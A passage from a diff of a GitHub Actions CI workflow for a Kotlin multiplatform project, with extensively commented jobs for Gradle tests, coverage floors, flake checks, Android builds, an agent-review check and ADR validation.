+      # and the gate could not have caught it: this job died during install and
+      # never reached `sgate run-all`. One flag per expression leaves nothing to
+      # split, and quoting the variable instead would have handed Gradle a single
+      # "-D a -D b" argument.
+      #
+      # maxAttempts is absent on push on purpose: repeat(0) skips every test body.
+      #
+      # `set -o pipefail`, and it is the whole reason this step can fail at all.
+      #
+      # `... 2>&1 | tee build.log` returns tee's status, which is 0. GitHub's default
+      # shell is `bash -e` with no pipefail, so this step had been reporting success
+      # for every Gradle failure it contained: tests, detekt, koverReport, all of them.
+      # Measured on 2026-10-16 on a pristine origin/main: `:shared:detekt` fails with
+      # 109 findings, and the suite job on that same commit is green. The 109 findings
+      # were invisible because nothing that read them could fail.
+      #
+      # `check-test-runs.py --gradle-log build.log` did not catch it either: it reads
+      # the log to exempt UP-TO-DATE tasks from its freshness floor, and a failed task
+      # has run and produced XML just as a passing one has.
+      #
+      # The log is still written, because two steps below read it. The exit status is
+      # now Gradle's again. `scripts/check-workflow-exit-status.py` fails if a `run:`
+      # block in any workflow pipes without this, so the pipe cannot come back.
+      #
+      # `:adr-cli:test` and `:adr-core:jvmTest` run in their own invocation
+      # below, not here, and that is deliberate. Both modules hold a
+      # `@Tag("slow")` class, and neither test task ran in CI at all — the
+      # exact shape the `Slow tests ran` step exists to refuse: a test the
+      # local loop never runs, and CI never runs either, is a test whose
+      # breakage nobody ever sees.
+      #
+      # Their own invocation is what keeps them out of the coverage aggregate.
+      # Kover's aggregation plugin picks up whichever `Test` tasks happen to be
+      # in the task graph, so naming them here would add the ADR modules — 93
+      # covered lines of 1008 — to the aggregate the coverage floor measures,
+      # and the floor would move. They are tooling, like `:detekt-rules`, which
+      # the settings file skips for the same reason.
+
+      # The name says what the step runs: the suite, and nothing else. It ran
+      # neither coverage nor detekt any more, and the name said both — a name
+      # that lies is a name a reader has to check.
+      #
+      # The rename is safe because the registry's anchors moved to the coverage
+      # job with the job graph: `workflow-exit-status` anchors at
+      # `.github/workflows/ci.yml#Gradle (coverage)` now, and
+      # `scripts/check-waiver-references.py` requires an anchor to resolve to a
+      # STEP NAME — not to a name this file used to carry.
+      - name: Gradle (tests)
+        # `:androidApp:test` is NO-SOURCE and runs zero tests: the module has
+        # no JVM unit-test source set — its suite is `src/androidTest/`, which
+        # needs a device and cannot run here. The task stays in this list so the
+        # list stays a copy of `koverReport`'s (build.gradle.kts:388-399), and
+        # `scripts/check-coverage-task-list.py` is the gate that answers the
+        # real question — does a project in the coverage denominator have a
+        # test source set with files in it.
+        run: |
+          set -o pipefail
+          ./gradlew --continue \
+            --no-parallel \
+            :mcp-server:jar \
+            :shared:verifyToolSurface \
+            :shared:jvmTest \
+            :shared:testAndroidHostTest \
+            :desktopApp:test \
+            :mcp-server:test \
+            :androidApp:test \
+            :detekt-rules:test \
+            :tools:unwritten-properties:test \
+            -Ptest.population="$TEST_POPULATION" \
+            -Pcoverage.enabled=false \
+            -Dsingularity.test.steps=true -Dsingularity.test.a11y=fail \
+            ${{ github.event_name == 'pull_request' && '-Dretry.maxAttempts=2' || '' }} \
+            ${{ github.event_name == 'pull_request' && '-Dretry.failOnPassedAfterRetry=false' || '' }} \
+            ${{ github.event_name != 'pull_request' && '-Dretry.failOnPassedAfterRetry=true' || '' }} \
+            2>&1 | tee build.log
+
+      # junitparser arrived with the tooling step above. It was installed here
+      # separately because that install kept failing for three different reasons
+      # in a row; one installer now serves both jobs.
+
+      # Emit GitHub annotations per failing/retry-passed test from JUnit XML.
+      # Reads EVERY module's JUnit XML (the glob is rooted at the repository, so
+      # shared, mcp-server, desktopApp and any other module are all covered) and
+      # emits ::error / ::notice commands carrying the failure MESSAGE.
+      #
+      # The path used to be the desktopApp directory alone, so a failure in
+      # mcp-server or shared reached the log as "AssertionFailedError at
+      # SomeTest.kt:400" with no message — and reading the message meant
+      # reproducing the failure locally and digging through the XML by hand.
+      #
+      # `**/build/...`, not `*/build/...`: a module nested one level deeper
+      # (`:tools:unwritten-properties` lives in tools/unwritten-properties) has
+      # TWO segments before `build`, and the single-segment glob skipped it —
+      # so a failure in a nested module reached the log with no annotation at
+      # all, which is the same silence the desktopApp-only path had.
+      # continue-on-error: annotation failures are advisory and must not crash CI.
+      - name: Per-test GitHub annotations (advisory)
+        if: ${{ !cancelled() }}
+        continue-on-error: true
+        run: python3 scripts/junit-annotations.py --glob "**/build/test-results/**/*.xml" .
+
+      # Three separate invocations, not one comma-separated list. The parity table
+      # in check-gate-wiring.py keys on the exact spelling of the argument, so
+      # merging these would leave GATE_ARG_PARITY declaring comparisons it no longer
+      # performs — a declaration that reads as enforced and is not.
+      # --gradle-log build.log: exempts any source set whose test task went UP-TO-DATE
+      # or FROM-CACHED from the freshness check. A test task is never FROM-CACHED
+      # (the root build file says so), but it can be UP-TO-DATE in a local run, and
+      # the exemption is what keeps that from being reported as staleness.
+      # Every invocation's exit code is kept and every target is measured,
+      # because the two verdicts are different investigations (check-test-runs.py
+      # documents them): exit 3 = "no report at all", so no floor was compared and
+      # the reader must find out why nothing ran; exit 1 = "a report exists and
+      # is below the floor", so the suite ran and lost coverage. The step used to
+      # stop at the first non-zero code, so a missing report for one target hid
+      # the other two verdicts: the reader saw one failure and never learned
+      # whether the rest of the suite had run.
+      #
+      # A below-floor report outranks a missing one when both happen: it is a
+      # regression of a measurement that happened, and the missing report is
+      # printed next to it anyway.
+      - name: Executed test counts
+        run: |
+          jvm=0
+          host=0
+          mcp=0
+          python3 scripts/check-test-runs.py --require shared:jvmTest,desktopApp:test --since "$RUN_STARTED" --gradle-log build.log || jvm=$?
+          python3 scripts/check-test-runs.py --require shared:testAndroidHostTest --since "$RUN_STARTED" --gradle-log build.log || host=$?
+          # The mcp-server module keeps ONE test: the end-to-end one, which spawns the
+          # jar. It is slow, so the fast population has nothing to run in that module —
+          # and "nothing ran" is not a failure of a source set that has nothing to run
+          # in this population. The floor is therefore compared where the test runs.
+          if [ "$TEST_POPULATION" = "full" ]; then
+            python3 scripts/check-test-runs.py --require mcp-server:test --since "$RUN_STARTED" --gradle-log build.log || mcp=$?
+          fi
+          echo "test-run verdicts — jvm/desktop: $jvm, android-host: $host, mcp-server: $mcp"
+          failed=0
+          missing=0
+          for code in "$jvm" "$host" "$mcp"; do
+            case "$code" in
+              0) ;;
+              3) missing=1 ;;
+              *) failed=1 ;;
+            esac
+          done
+          if [ "$failed" -ne 0 ]; then
+            echo "::error::a test source set produced a report below its floor (or failed outright)"
+            exit 1
+          fi
+          if [ "$missing" -ne 0 ]; then
+            echo "::error::a test source set produced no JUnit report at all — nothing ran, so no floor was compared"
+            exit 3
+          fi
+
+      # desktop only, deliberately. The android target's results come from
+      # :androidApp:connectedDebugAndroidTest, which no CI job runs, and
+      # --maestro would demand a `scenario:` tag on every flow that claims android —
+      # 18 of 19 specs claim it and exactly one flow carries the tag today. Running
+      # both targets from this job therefore produced a matrix whose android column
+      # was permanently `not-run` while looking like a measurement. That silence is
+      # now a recorded decision (config/docs/traceability-ratchet.json, known_gaps),
+      # not an accident.
+      #
+      # Exits 2 when a declared target produced zero testcases — never
+      # continue-on-error.
+      #
+      # Placement is load-bearing, not stylistic. This step reads
+      # `desktopApp/build/test-results/test/`, and every Gradle invocation below it
+      # can re-run `:desktopApp:test` and overwrite that directory. Run 38933517902
+      # measured what that costs: `:koverMarkdownTable` (advisory, `|| true`) was the
+      # first invocation that found its test task out of date, re-ran it *without*
+      # a population, and desktopApp's default is `excludeTags("slow")` — so the
+      # `@Tag("slow")` scenario classes were skipped rather than executed. The suite
+      # stayed green, `check-test-runs` had already counted the full 135 tests, and
+      # this step then failed with "declared target produced zero testcases" against a
+      # run that had in fact measured them. Normalising immediately after the test
+      # run is what makes the input a fact rather than a race with later Gradle steps.
+      #
+      # `--partial` on a fast-only population, and this is load-bearing rather than
+      # a convenience: the per-scenario rule asks "did the scenario's carrier
+      # run?", and every desktop scenario carrier is a slow class (it mounts the
+      # Compose harness). On a fast-only run the answer is "no" BY CONSTRUCTION —
+      # that is the subset the run was asked for, not a defect. The full population
+      # keeps the rule, which is where "the scenario was claimed and did not run"
+      # is still a finding.
+      #
+      # "Does this population include the slow half?" is a question the
+      # populations file answers, and the file is read here — not the NAME
+      # compared against a literal. A third population would otherwise have to
+      # be taught to this step by name, and a population nobody has written yet
+      # would take the fast branch by accident. The file says `includes-slow`
+      # for every population it declares, and the gate
+      # (scripts/check-gradle-test-population.py) holds the shell and the file
+      # to the same answer.
+      - name: Normalise desktop results into the scenario matrix
+        run: |
+          set -euo pipefail
+          ARGS=(--targets desktop --out-dir build/traceability)
+          INCLUDES_SLOW=$(grep -F -m1 "${TEST_POPULATION}.includes-slow:" \
+            config/test-populations.properties | cut -d ':' -f 2- | tr -d '[:space:]' || echo "")
+          if [ -z "$INCLUDES_SLOW" ]; then
+            echo "::error::the population '$TEST_POPULATION' does not say whether it includes the slow half (config/test-populations.properties)"
+            exit 1
+          fi
+          if [ "$INCLUDES_SLOW" != "true" ]; then
+            ARGS+=(--partial)
+          fi
+          python3 -m traceability results "${ARGS[@]}"
+
+      - name: Render result matrix into the job summary
+        if: ${{ !cancelled() }}
+        run: |
+          if [ -f build/traceability/result-matrix.md ]; then
+            { echo "## Scenario result matrix"; grep -v '^<!--' build/traceability/result-matrix.md; } >> "$GITHUB_STEP_SUMMARY"
+          else
+            echo "_result matrix not produced (see the step above)_" >> "$GITHUB_STEP_SUMMARY"
+          fi
+
+      # Compares with the last green run of THIS branch, falling back to main.
+      # The previous version filtered on $GITHUB_REF_NAME, which on a PR is
+      # "<n>/merge" and so never matched — it silently skipped on every PR.
+      #
+      # Placement is load-bearing, and it is the same reason the traceability
+      # normaliser sits above this: `--current` reads `shared/build/test-results/
+      # jvmTest`, and every Gradle invocation below this step can re-run
+      # `:shared:jvmTest` and overwrite that directory. A flake rate computed from
+      # a re-measured set compares this run against a previous run's set and calls
+      # the difference flaky — which is the one thing a flake measurement must not
+      # do. It ran after `Coverage floors`, `Coverage table` and
+      # `Kover verify (detekt-rules)`, any of which pulls the shared test task.
+      #
+      # Advisory: the step is soft (`continue-on-error`), and a soft step
+      # nobody declares is a step that reads as a gate. The name says what the
+      # step is; this comment says what kind of step it is.
+      - name: Late flake pass (advisory)
+        if: ${{ !cancelled() }}
+        continue-on-error: true
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BRANCH: ${{ github.head_ref || github.ref_name }}
+        run: |
+          prev_on() {
+            gh run list --workflow ci.yml --branch "$1" --status success --limit 1 \
+              --json databaseId --jq '.[0].databaseId // empty'
+          }
+          PREV=$(prev_on "$BRANCH")
+          [ -n "$PREV" ] || PREV=$(prev_on main)
+          if [ -z "$PREV" ]; then echo "no previous successful run — skipped"; exit 0; fi
+          gh run download "$PREV" -n junit-results -D /tmp/prev-run || { echo "no junit-results in run $PREV — skipped"; exit 0; }
+          python3 scripts/check-flaky-tests.py \
+            --current shared/build/test-results/jvmTest \
+            --previous /tmp/prev-run \
+            --summary "$GITHUB_STEP_SUMMARY"
+
+      # The two ADR modules, in their own Gradle invocation. See the note above
+      # the main invocation: a test task in the kover invocation would join the
+      # coverage aggregate and move the floor, and the point of running them is
+      # that their slow classes execute at all.
+      #
+      # The invocation selects the job's population — the same one every other
+      # test-capable invocation in this job selects. It used to hardcode
+      # `fast,slow` and run the slow classes on every pull request, but that is
+      # a second population inside one job: the population gate reads the
+      # invocations and refuses to let them disagree, because a later
+      # invocation that re-runs a test task against a different population
+      # measures something the earlier gates did not count. So the slow classes
+      # of the ADR modules run when this job runs the full population
+      # (nightly, or a pull request labelled `run-full-tests`), and the job's
+      # population is the only thing that decides it.
+      #
+      # Placement is load-bearing, and it is the placement rule of
+      # `check-build-output-readers.py`: a step that reads build output has to
+      # read it before any Gradle invocation that can rewrite it. This is the
+      # second test-capable invocation in the job, so every reader — the
+      # annotations, the traceability normaliser, the matrix, the flake pass —
+      # has to sit above it. It cannot sit right after the main run for the
+      # same reason: that would put a re-run risk between the readers and the
+      # numbers they took.
+      #
+      # The build cache is on here too, for the same reason as in the main
+      # invocation: the test tasks are excluded from it by the build, not by the
+      # step.
+      #
+      # It cannot reach the shared or desktop test tasks either: `:adr-cli`
+      # depends on `:adr-core` and `:core-base`, never on `:shared` — the
+      # dependency edge is the point of that build file. So the reports this
+      # invocation writes are its own, and the readers above have already
+      # measured theirs.
+      - name: ADR module tests
+        run: |
+          set -o pipefail
+          ./gradlew --no-parallel \
+            :adr-cli:test :adr-core:jvmTest \
+            -Ptest.population="$TEST_POPULATION" \
+            -Pcoverage.enabled=false \
+            2>&1 | tee adr-tests.log
+
+      # The `slow` classes the full run owes the reader.
+      #
+      # The run floor above requires the `fast` classes, because `fast` is what
+      # a local run executes; the `slow` classes are the ones the default local
+      # run excludes. A test the local loop never runs is a test whose breakage
+      # nobody local ever sees: `McpServerEndToEndTest` sat broken on `main`
+      # for exactly that reason — tagged slow, broken since the read surface
+      # changed the shape of its answer, and found by CI rather than by anyone
+      # holding the tree.
+      #
+      # Placed after the ADR invocation because it reads what both invocations
+      # wrote: the slow classes live in seven source sets, two of them in the ADR
+      # modules, and a check that ran before their reports existed would report
+      # them as missing. It is placed before every Gradle invocation below it,
+      # because each of those can re-run a test task and overwrite the report
+      # this reads — a check that reads a report after it has been overwritten
+      # measures the wrong run.
+      #
+      # This placement is the one the placement rule cannot check for itself.
+      # `check-build-output-readers.py` recognises a reader by the build paths in
+      # the step's command, and this step's command names the script, not the
+      # paths — so the gate sees a step that reads nothing, and a step moved
+      # below `Coverage floors` would be accepted silently. Naming the paths in
+      # the command would make the gate see it, and would make the gate fail:
+      # the ADR invocation above is the second test-capable invocation in the
+      # job, and the rule says a reader reads before an invocation that can
+      # rewrite what it reads — while this step has to read exactly what that
+      # invocation wrote. The two cannot both hold in one job, so the placement
+      # is maintained here, by hand, and this comment is what makes it
+      # maintainable: a reader of this file can see why the step sits where it
+      # sits and what would break if it moved.
+      #
+      # The check belongs to the population that includes the slow half. A slow
+      # class owes the reader a report only when the run that selected the slow
+      # classes happened; in a fast-only population the slow classes did not run,
+      # there is no report, and "there is no report" is not a pass — it is the
+      # absence of the run this step checks. So the step says so and stops, and
+      # the population that includes the slow half (nightly, or a pull request
+      # labelled `run-full-tests`) is where the slow classes are held to their
+      # reports.
+      #
+      # "Does this population include the slow half?" is asked of the
+      # populations file, not of the NAME: the file declares `includes-slow` for
+      # every population it declares, so a population nobody has written yet
+      # takes the branch the file says and not the branch a literal happens to
+      # name. A population the file does not answer stops the job here rather
+      # than passing quietly.
+      - name: Slow tests ran
+        run: |
+          INCLUDES_SLOW=$(grep -F -m1 "${TEST_POPULATION}.includes-slow:" \
+            config/test-populations.properties | cut -d ':' -f 2- | tr -d '[:space:]' || echo "")
+          if [ -z "$INCLUDES_SLOW" ]; then
+            echo "::error::the population '$TEST_POPULATION' does not say whether it includes the slow half (config/test-populations.properties)"
+            exit 1
+          fi
+          if [ "$INCLUDES_SLOW" != "true" ]; then
+            echo "the population '$TEST_POPULATION' does not include the slow half — it owes the reader no slow class"
+            exit 0
+          fi
+          python3 scripts/check-slow-tests-ran.py
+
+      # Detekt passed before this point — if DI/import files changed in a rebase,
+      # this catches a compile break that `jvmTest` (already green) might miss.
+      - name: Post-rebase DI compile
+        run: python3 scripts/check-rebase-compiles.py
+
+      # The app coverage floors are NOT on the pull-request path: they are the
+      # conditional steps below, gated on `COVERAGE_ENABLED`, which this job
+      # measures only on a push, the schedule, a manual run or a labelled pull
+      # request. An ordinary pull request runs the suite WITHOUT the agent, so a
+      # coverage number measured on that run would be a number about a different
+      # build than the one the floor is declared against — and a pull request
+      # that failed a coverage floor would be failing on a measurement it never
+      # took.
+      #
+      # The detekt-rules floor stays HERE, and it is not an oversight: it is a
+      # gate about the custom rules, not about the app's coverage, and it is
+      # enforced on every path.
+
+      # detekt-rules branch coverage floor: 60% (below 2026-10-15 measured 65.6%, 725/1105),
+      # declared once — DETEKT_RULE_BRANCH_FLOOR in settings.gradle.kts, bound by
+      # the module's rule — and enforced by Kover's own verify rule, not by a script
+      # that parses Kover's XML. Blocking.
+      # Runs here (not in the static-gates registry) because it needs Gradle.
+      # `./check.sh` names the same task, so the local loop rehearses this gate:
+      # scripts/check-gate-wiring.py Part I would fail otherwise.
+      - name: Kover verify (detekt-rules)
+        run: ./gradlew :detekt-rules:koverVerify -Ptest.population="$TEST_POPULATION"
+
+      # The meta-gate runs HERE, not in the `static` job and not in the shared
+      # registry. Part B proves `check-test-runs.py` can fail by sabotaging its
+      # baseline and re-running it, and that gate reads JUnit XML which only exists
+      # once the Gradle step above has run. Called from a static context it fails
+      # with "already fails on a clean tree" — a true statement that reads as a
+      # false alarm (#206).
+      #
+      # GATE_WIRING_GRADLE=1 because the `detekt-rule-coverage-floor` positive control
+      # is gradle-backed: it raises DETEKT_RULE_BRANCH_FLOOR in settings.gradle.kts and
+      # requires :detekt-rules:koverVerify to exit non-zero. Without this env var that
+      # control is SKIPPED here, which is the same as not running it — check.sh has
+      # always set the variable and CI never has, so the control has only ever proven
+      # anything locally.
+      # Affordable for the same reason as check.sh: the Gradle step above already ran, so
+      # configuration is cached and the control costs a verify pass, not a test suite.
+      # `--except-can-fail`: the fast controls are proved by the static job
+      # (`sgate run-all --with-controls`), and running them here as well would
+      # prove the same thing twice at the price of minutes. This job proves
+      # the rest — the wiring, the registry parity, the CI shape — and the
+      # Gradle-backed control, which needs the daemon this job already has.
+      - name: Gates are wired and can fail
+        if: ${{ !cancelled() }}
+        env:
+          GATE_WIRING_GRADLE: "1"
+        run: python3 scripts/check-gate-wiring.py --except-can-fail
+
+      - name: Gradle (coverage)
+        if: env.COVERAGE_ENABLED == 'true'
+        run: |
+          set -o pipefail
+          ./gradlew --continue --no-parallel :mcp-server:jar koverReport koverHtml -Ptest.population="$TEST_POPULATION" -Pcoverage.enabled=true 2>&1 | tee coverage.log
+      - name: Coverage floors
+        if: env.COVERAGE_ENABLED == 'true'
+        run: ./gradlew :koverVerify -Ptest.population="$TEST_POPULATION"
+      - name: Upload JUnit results
+        if: ${{ !cancelled() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: junit-results
+          path: |
+            shared/build/test-results/jvmTest/**/*.xml
+            shared/build/test-results/testAndroidHostTest/**/*.xml
+            desktopApp/build/test-results/test/**/*.xml
+            mcp-server/build/test-results/test/**/*.xml
+          if-no-files-found: error
+          retention-days: 7
+
+      - name: Upload Allure results
+        if: ${{ !cancelled() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: allure-results
+          path: |
+            shared/build/allure-results/**/*
+            desktopApp/build/allure-results/**/*
+            mcp-server/build/allure-results/**/*
+          if-no-files-found: ignore
+          retention-days: 14
+
+      - name: Upload evidence (diagnostics, traceability, coverage)
+        if: ${{ !cancelled() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: ci-evidence-${{ github.run_id }}
+          path: |
+            desktopApp/build/diagnostics/**
+            shared/build/diagnostics/**
+            mcp-server/build/diagnostics/**
+            build/traceability/**
+            build/reports/kover/report.xml
+            build/reports/kover/**/*.html
+            **/build/reports/configuration-cache/**
+          if-no-files-found: ignore
+          retention-days: 14
+
+      # Upload HTML test reports as a separate artifact for direct link access
+      # in the PR check summary (FR-002).
+      - name: Upload HTML test reports
+        if: ${{ !cancelled() }}
+        uses: actions/upload-artifact@v7
+        with:
+          name: html-reports-${{ github.run_id }}
+          path: desktopApp/build/reports/tests/test/**/*.html
+          if-no-files-found: warn
+          retention-days: 14
+
+  # free and pro are two different Gradle graphs (-PwithPro), so two matrix legs.
+  android:
+    name: Android (${{ matrix.variant }})
+    runs-on: ubuntu-24.04
+    timeout-minutes: 30
+    needs: [changes]
+    # Run when android/shared code changed, or always on main, or on workflow_dispatch.
+    if: >
+      (
+        needs.changes.outputs.android == 'true'
+        || needs.changes.outputs.shared == 'true'
+        || needs.changes.outputs.all == 'true'
+        || github.ref == 'refs/heads/main'
+        || github.event_name == 'workflow_dispatch'
+      )
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # The free leg compiles and stops there. It used to assemble the debug
+          # APK as well, and that was the duplication: e2e.yml's `build-apk`
+          # assembles the same debug APK for the same commit, and that is the
+          # copy the Maestro shards install. One APK, two workflows, two
+          # runners, two build caches — setup-gradle keys the Gradle home per
+          # job, so the second build could not reuse the first one's entries
+          # (docs/decisions/2026-10-06-ci-single-gate-registry-and-leaf-split.md).
+          #
+          # What the free leg still proves: `androidMain` compiles, which is the
+          # only thing that sees a typo in an Android source file
+          # (docs/decisions/2026-10-07-android-maintenance-needs-a-ci-gate.md),
+          # and the free configuration is the one a fresh clone builds
+          # (settings.gradle.kts — `pro/` compiles only under the flag, so CI
+          # has to run both configurations).
+          #
+          # What it no longer proves: that the APK packages. That is proved
+          # where the APK is used — e2e.yml's `build-apk`, on every run of the
+          # E2E workflow (every push to main, every tag, every nightly, every
+          # labelled PR) and android-device-tests.yml — and locally by
+          # `check.sh`, which still assembles it.
+          #
+          # `compileDebugAndroidTestKotlin` is here for the instrumented source
+          # set, which nothing else compiles on a pull request. The device tier
+          # runs on a schedule, on main, and on a label — so a broken
+          # androidTest source would sit there until the next nightly, and the
+          # nightly would be red for a reason that has nothing to do with the
+          # change under test. Compiling it costs a Kotlin compile and no
+          # emulator; the tier's *running* is still the device job's business.
+          - variant: free
+            flags: ""
+            tasks: ":androidApp:compileDebugKotlin :androidApp:compileDebugAndroidTestKotlin"
+          # No Tracer token: proves FSL code compiles and the DI rebinding holds,
+          # not that the vendor SDK works.
+          #
+          # The pro leg keeps `assembleDebug`: the pro variant is packaged
+          # nowhere else. The free variant is packaged in e2e.yml; the pro one
+          # is not shipped by release.yml either, so this leg is the only proof
+          # that it packages at all.
+          - variant: pro
+            flags: "-PwithPro=true"
+            tasks: ":pro:detekt :androidApp:compileDebugKotlin :androidApp:assembleDebug :pro:testDebugUnitTest"
+    steps:
+      - uses: actions/checkout@v7
+
+      - uses: ./.github/actions/setup-jvm-gradle
+        with:
+          cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}
+
+      # `-Pcoverage.enabled=false`: this job is on the pull-request path, and
+      # the pull-request path carries no instrumented suite. The pro leg runs
+      # `:pro:testDebugUnitTest`, and without the opt-out the Kover agent
+      # attaches to it — the cost of a measurement nobody asked for, paid on
+      # the path that is supposed to answer in minutes. The coverage job is
+      # where the measurement belongs.
+      - name: Compile / lint / test
+        run: ./gradlew --continue ${{ matrix.flags }} ${{ matrix.tasks }} -Pcoverage.enabled=false
+        env:
+          # AppTracer tokens — only meaningful for pro, ignored (plugin disabled) for free.
+          TRACER_APP_TOKEN: ${{ secrets.TRACER_APP_TOKEN }}
+          TRACER_PLUGIN_TOKEN: ${{ secrets.TRACER_PLUGIN_TOKEN }}
+
+      # There is no debug APK to upload any more. The free leg does not assemble
+      # one (see the matrix above), and the pro leg assembles the *pro* variant,
+      # which is not the "free debug build" this artifact claimed to be.
+      #
+      # Nothing in this repository read `apk-debug-<run_id>` — the release
+      # workflow builds its own APK, and the Maestro shards take `e2e-apk`. The
+      # APK it carried was also assembled without `local.properties`, so the app
+      # it installed opened on the "SUPABASE_URL" error screen rather than on a
+      # usable one. The APK that actually runs is e2e.yml's `e2e-apk`: the same
+      # free graph, with the placeholder Supabase credentials and the auth
+      # bypass, on the runs where the E2E workflow runs.
+
+  # The rule "a change is reviewed by a separate agent before the pull request
+  # is opened" — AGENTS.md carries it in one line, and nothing could check it.
+  # The line was executed for a session and then not again, and no pull request
+  # carried a review that anybody could see.
+  #
+  # This job is the check: the pull request carries a comment that says the
+  # review happened and what its verdict was. A pull request without one fails
+  # here, and the CI gate waits for this job — so the rule is not a sentence
+  # in a document but a thing that can fail.
+  #
+  # It runs on pull requests only: a push to main has no review to carry.
+  agent-review:
+    name: Agent review
+    # The pull request only. A run triggered by a comment would not help: GitHub
+    # counts the checks of an `issue_comment` run on the default branch, so the
+    # green would land on main and not on the pull request that is waiting for
+    # the review. The review is re-counted by a pull-request-scoped trigger — a
+    # push, or the `agent-reviewed` label.
+    if: ${{ github.event_name == 'pull_request' }}
+    runs-on: ubuntu-24.04
+    # The job does one thing, but it pays for the tooling setup first: the
+    # shared action installs the venv and the linters, and that alone takes
+    # about two minutes. A three-minute budget turned a slow runner into a
+    # `cancelled` job, and the CI gate reads a cancelled job as red.
+    timeout-minutes: 10
+    permissions:
+      contents: read
+      # The comments of the pull request are read through the issue API.
+      issues: read
+      pull-requests: read
+    steps:
+      - uses: actions/checkout@v7
+
+      # The same action as the other jobs: the script imports click, and the
+      # action installs it into the checkout's own venv.
+      - name: Set up gate tooling
+        uses: ./.github/actions/setup-python-tools
+
+      - name: The review the agent left on the pull request
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+        run: python3 scripts/ci/check-agent-review.py --pr "$PR_NUMBER"
+
+  # The only job branch protection should require. `if: always()` is load-bearing:
+  # without it this job is skipped when a leaf fails, and a skipped job reads as
+  # neutral. The assertion is load-bearing too: a failed leaf leaves its siblings
+  # `skipped`, so checking only for "no failures" would pass on a skipped job.
+  #
+  # Needs [static, meta, tests, android, changes, agent-review]. When a PR touches only scripts/:
+  # - static runs (scripts changed), tests/android are skipped by their if: condition.
+  # - ci-gate still runs (always()) and waits for static + changes to complete.
+  # - The success check below allows skipped (tests/android) as valid outcomes.
+  #
+  # agent-review is in the list because the review is part of what a pull request
+  # has to carry, and a gate that does not wait for it would report green while
+  # the review is missing. It is skipped on a push to main, and a skipped job
+  # counts as a valid outcome below.
+  #
+  # `quick` and `detekt` are in the list because they now carry verdicts: the
+  # affected-test job is the pull request's fast signal, and detekt is judged
+  # in its own job. A gate that does not wait for them reports green while
+  # their verdicts are still missing. The coverage measurement needs no entry:
+  # it is two conditional steps of `tests`, which is already in the list, and a
+  # skipped step is not a job the gate waits for.
+  ci-gate:
+    name: CI gate
+    if: ${{ always() }}
+    needs: [static, meta, tests, android, changes, agent-review, quick, detekt]
+    runs-on: ubuntu-24.04
+    timeout-minutes: 2
+    steps:
+      - name: All required jobs succeeded
+        env:
+          RESULTS: ${{ join(needs.*.result, ' ') }}
+        run: |
+          echo "job results: $RESULTS"
+          # static must pass; tests/android may be skipped (path-filtered).
+          # A skipped job has result "skipped" — not a failure.
+          for r in $RESULTS; do
+            case "$r" in
+              success|skipped) ;;
+              *) echo "FAILED: $r"; exit 1 ;;
+            esac
+          done
+
+  # ── ADR + spec-kit ──────────────────────────────────────────────────────
+  # Moved out of adr-gate.yml; the workflow-level `paths:` filter is now
+  # changes.outputs.adr, because GitHub cannot filter individual jobs.
+  adr-gate:
+    runs-on: ubuntu-latest
+    needs: [changes]
+    if: needs.changes.outputs.adr == 'true' || github.ref == 'refs/heads/main'
+    # GitHub filters by `paths:` per WORKFLOW, not per job, so this `if:` is what
+    # reproduces the filter adr-gate.yml used to declare. The price is stated in
+    # docs/decisions if this ever gets revisited: the filter now lives in a job
+    # expression rather than where a reader looks for it.
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # The runner's default JRE is 17; :adr-cli:installDist builds with the
+      # Gradle toolchain (21) and the installed script then dies with
+      # UnsupportedClassVersionError (class file 65 vs 61) on `validate`.
+      - name: Set up Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+
+      # uv as an action, not `curl … | sh`: the same installer the rest of ci.yml
+      # uses, so there is one way this repo gets uv on a runner.
+      - uses: astral-sh/setup-uv@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install spec-kit
+        run: uv tool install specify-cli
+
+      # The adr-ci workflow's openspec-validate step shells out to the
+      # `openspec` binary; without it the inner step exits 127 and the whole
+      # workflow reports "Shell command exited with code 127". Same pin
+      # convention as ci.yml's static job.
+      - name: Install openspec
+        env:
+          OPENSPEC_VERSION: ${{ vars.OPENSPEC_VERSION || '1.14.0' }}
+        run: npm install --global "@fission-ai/openspec@${OPENSPEC_VERSION}"
+
+      # `set -o pipefail` again: this step installs the tool the rest of the job runs.
+      # With the pipeline swallowing the status, a failed `installDist` left the job
+      # proceeding to invoke a binary from the previous run or no binary at all, and
+      # `singularity-adr validate` then failed on its own — a symptom three steps away
+      # from the cause. `scripts/check-workflow-exit-status.py` found this one.
+      - name: Install singularity-adr
+        run: |
+          set -o pipefail
+          ./gradlew :adr-cli:installDist 2>&1 | tail -5
+          ADR_BIN="$PWD/adr-cli/build/install/singularity-adr/bin/singularity-adr"
+          chmod +x "$ADR_BIN"
+          echo "$PWD/adr-cli/build/install/singularity-adr/bin" >> "$GITHUB_PATH"
+
+      - name: ADR validation
+        run: singularity-adr validate
+
+      - name: ADR stale check (advisory)
+        run: singularity-adr stale --days 30 || true
+
+      - name: Refresh DIGEST if needed
+        run: |
+          if ! git diff --quiet docs/decisions/; then
+            ./scripts/refresh-decisions-digest.sh
+            git add docs/decisions/DIGEST.md
+          fi
+
+      - name: spec-kit CI workflow
+        run: |
+          specify workflow run adr-ci --input ci_mode=true 2>&1 || {
+            echo "spec-kit workflow failed"
+            exit 1
+          }
+
+  spec-create:
+    if: github.event_name == 'pull_request' && (needs.changes.outputs.adr == 'true' || github.ref == 'refs/heads/main')
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    needs: [changes]
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+
+      # uv as an action, not `curl … | sh`: the same installer the rest of ci.yml
+      # uses, so there is one way this repo gets uv on a runner.
+      - uses: astral-sh/setup-uv@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install spec-kit
+        run: uv tool install specify-cli
+
+      # Same swallow as the adr-gate job's copy above; `check-workflow-exit-status.py`
